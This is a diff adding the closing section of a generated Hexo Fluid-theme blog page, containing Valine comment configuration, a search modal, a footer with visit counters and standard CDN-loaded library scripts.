+          {"appId":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","appKey":"tdZv3tC3tP1IszSKxEodRe6e","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
